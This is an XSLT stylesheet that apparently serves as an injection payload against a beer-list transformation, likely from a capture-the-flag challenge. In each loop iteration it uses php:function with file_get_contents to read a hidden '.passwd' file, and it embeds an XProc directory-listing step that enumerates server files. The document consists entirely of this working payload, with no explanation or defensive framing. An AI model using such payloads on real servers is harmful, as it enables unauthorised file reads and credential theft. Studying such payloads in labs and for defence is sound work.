<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:10pt;background-color:#EEFFAA">
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <xsl:value-of select="php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
  </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
    <p>
    <xsl:value-of select="prct"/>
    <span style="font-style:bold"> (<xsl:value-of select="prct"/> %)</span>
    </p>
  </div>
</xsl:for-each>
  <p:declare-step xmlns:p="http://www.w3.org/ns/xproc" xmlns:c="http://www.w3.org/ns/xproc-step" version="1.0">
   <p:input port="source"> </p:input>
   <p:output port="result"/>
   <p:directory-list path="."/>
</p:declare-step>
</body>
</html> 

